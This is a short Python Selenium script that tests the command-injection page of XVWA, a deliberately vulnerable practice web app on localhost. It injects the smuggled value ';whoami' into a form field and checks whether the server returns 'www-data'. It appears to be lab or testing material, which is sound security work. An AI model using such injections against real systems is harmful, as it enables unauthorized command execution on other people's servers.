from selenium import webdriver
from selenium.webdriver.common.by import By

webpage = "http://localhost/xvwa/vulnerabilities/cmdi/"
commandToInject = ";whoami"

driver = webdriver.Firefox()
print("Loading page " + webpage)
driver.get(webpage)

sbox = driver.find_element("name", "target")
print("Sending payload to target field " + commandToInject)
sbox.send_keys(commandToInject)

submit = driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div[2]/div/form/div/div/button")
submit.click()

verify = driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div[2]/pre")
print("Checking if vulnerable..")
print("If www-data is printed, then we conclude it is vulnerable")
if (verify.text == "www-data"):
  print("It is vulnerable!")
else:
  print("It is not vulnerable!")
